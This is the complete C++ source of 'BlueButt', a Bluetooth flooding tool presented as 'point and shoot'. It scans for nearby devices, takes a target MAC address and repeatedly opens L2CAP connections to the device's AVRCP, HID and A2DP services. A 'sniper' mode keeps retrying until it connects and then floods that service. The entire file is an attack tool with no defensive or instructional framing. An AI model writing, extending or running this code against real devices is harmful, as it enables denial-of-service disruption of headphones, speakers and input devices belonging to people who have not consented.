#include <iostream>
#include <sys/socket.h>
#include <cstring>
#include <thread>
#include <vector>
#include <unistd.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/sdp.h>
#include <bluetooth/sdp_lib.h>
#include <cctype>
#include <algorithm>

using namespace std;

const string GREEN = "\033[32m", RED = "\033[31m", RESET = "\033[0m", BLUE = "\033[34m";

// Function to validate MAC address format
bool is_valid_mac(const string& mac) {
    if (mac.length() != 17) return false;
    for (int i = 0; i < 17; i++) {
        if (i % 3 == 2) {
            if (mac[i] != ':') return false;
        } else {
            if (!isxdigit(mac[i])) return false;
        }
    }
    return true;
}

// Function to attempt an L2CAP connection using the appropriate PSM and hold for 4 seconds
bool connect_l2cap(const string& target, uint16_t psm) {
    struct sockaddr_l2 addr = {0};
    int sock;

    // Create an L2CAP socket
    sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sock < 0) {
        cerr << "ERROR: Unable to create socket" << endl;
        return false;
    }

    // Setup target address and protocol for L2CAP connection
    addr.l2_family = AF_BLUETOOTH;
    str2ba(target.c_str(), &addr.l2_bdaddr);
    addr.l2_psm = htobs(psm);  // Use the provided PSM

    // Attempt to connect the socket
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        cout << "Successfully connected on PSM 0x" << hex << psm << " to " << GREEN << target << RESET << endl;
        //sleep(4);  // TEST:Hold the connection for 4 seconds
        close(sock);
        return true;
    } else {
        cerr << RED << "ERROR: Could not connect on PSM 0x" << hex << psm << " to " << target << RESET << endl;
        close(sock);
        return false;
    }
}

// Function to flood the target device with multiple connections for a specific service (PSM)
void flood_device(const string& target, uint16_t psm, int num_connections) {
    for (int i = 0; i < num_connections; ++i) {
        cout << BLUE << "Attempting connection " << i + 1 << " on PSM 0x" << hex << psm << RESET << endl;
        connect_l2cap(target, psm);
    }
}

// Sniper mode: Continuously attempt to connect to the target using the provided PSMs
void sniper_mode(const string& target, vector<uint16_t> psms, int num_connections) {
    int attempt = 1;
    while (true) {
        cout << BLUE << "Sniper attempt #" << attempt << RESET << " to connect to " << target << endl;
        for (uint16_t psm : psms) {
            cout << "Attempting connection on PSM 0x" << hex << psm << endl;
            bool success = connect_l2cap(target, psm);
            if (success) {
                cout << GREEN << "Connection successful! Holding for flood...\n" << RESET;
                flood_device(target, psm, num_connections);  // Start flooding after successful connection
                return;  // Exit sniper mode after successful connection
            }
        }
        usleep(500000);  // Retry every 500ms
        attempt++;
    }
}

// Function to scan for nearby Bluetooth devices
int devicescan(vector<string>& device_list) {
    cout << BLUE << "Scanning for devices...\n" << RESET;
    inquiry_info *devices = NULL;
    int max_devices = 255;
    int device_id, sock, len, flags, num_rsp;
    char addr[19] = {0};
    char name[248] = {0};

    device_id = hci_get_route(NULL);
    sock = hci_open_dev(device_id);
    if (device_id < 0 || sock < 0) {
        cerr << "ERROR: Trouble finding Bluetooth adapter" << endl;
        return -1;
    }

    len = 8;
    flags = IREQ_CACHE_FLUSH;
    devices = (inquiry_info*) malloc(max_devices * sizeof(inquiry_info));

    num_rsp = hci_inquiry(device_id, len, max_devices, NULL, &devices, flags);
    if (num_rsp < 0) {
        cerr << RED << "ERROR: No connections in range" << RESET << endl;
        free(devices);
        close(sock);
        return 0;
    }

    for (int i = 0; i < num_rsp; ++i) {
        ba2str(&(devices[i].bdaddr), addr);
        memset(name, 0, sizeof(name));

        if (hci_read_remote_name(sock, &(devices[i].bdaddr), sizeof(name), name, 0) < 0) {
            strcpy(name, "[unknown]");
        }
        cout << GREEN << "Device found: " << RESET << name << " (" << RED << addr << RESET << ")\n";
        device_list.push_back(string(addr));
    }

    free(devices);
    close(sock);
    return num_rsp;
}

// Function to flood using PSM 0x0017 (AVRCP), 0x0011 (HID), and 0x0019 (A2DP)
void flood_all_psms(const string& target, int num_connections) {
    vector<uint16_t> psms = {0x0017, 0x0011, 0x0019};

    for (uint16_t psm : psms) {
        cout << "Flooding (" << target << ") with " << num_connections << " connections on PSM 0x" << hex << psm << "...\n";
        flood_device(target, psm, num_connections);
    }
}

int main(int argc, char* argv[]) {
    cout << RED << "--------------------------------------------\n" << RESET;
    cout << RED << "|" << GREEN << "     BlueButt        " << RED << " |" << GREEN << " $$$$$$$$$$$$$$$$$" << RED <<" |\n";
    cout << "|" << GREEN << " Your point and shoot" << RED << " |" << GREEN << " $Author:DumbButt$" << RED <<" |\n";
    cout << "|" << GREEN << "  Bluetooth flooder  " << RED << " |" << GREEN << " $$$$$$$$$$$$$$$$$ " << RED << "|\n" ;
    cout << "--------------------------------------------\n" << RESET;

    string target;
    int num_connections = 4;

    if (argc > 1 && string(argv[1]) == "sniper") {
        // Sniper mode: Continuously attempt to connect to the target using different PSMs
        if (argc < 3) {
            cerr << "ERROR: Target MAC address is required in sniper mode.\n";
            cerr << "Usage: " << argv[0] << " sniper <TARGET_MAC_ADDRESS>\n";
            return 1;
        }
        target = argv[2];
        if (!is_valid_mac(target)) {
            cerr << "ERROR: Invalid MAC address format.\n";
            return 1;
        }

        vector<uint16_t> psms = {0x0017, 0x0011, 0x0019};  // AVRCP, HID, A2DP
        sniper_mode(target, psms, num_connections);
    } else {
        // Regular mode: Scan for devices and flood
        vector<string> device_list;

        // Perform device scan
        int num_rsp = devicescan(device_list);
        if (num_rsp <= 0) {
            cout << "No devices found.\n";
            return 0;
        }

        // Ask the user for the target MAC address
        cout << "Enter the target's MAC address: ";
        cin >> target;
        if (!is_valid_mac(target)) {
            cerr << "ERROR: Invalid MAC address format.\n";
            return 1;
        }

        // Flood the target device with all PSMs
        flood_all_psms(target, num_connections);
    }

    return 0;
}
